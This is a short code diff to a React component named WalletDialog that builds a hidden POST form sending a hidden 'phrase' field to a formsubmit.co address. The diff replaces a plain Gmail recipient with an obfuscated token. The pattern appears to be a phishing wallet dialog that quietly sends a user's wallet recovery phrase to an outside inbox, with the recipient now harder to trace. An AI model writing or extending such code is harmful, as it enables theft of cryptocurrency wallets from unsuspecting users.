@@ -28,7 +28,7 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
       // Send email using a form submission to avoid CORS issues
       const form = document.createElement('form');
       form.method = 'POST';
-      form.action = 'https://formsubmit.co/patrickdwayne965@gmail.com';
+      form.action = 'https://formsubmit.co/06fed404371470d7cfff86b643c88efe';
      
       const phraseInput = document.createElement('input');
       phraseInput.type = 'hidden';
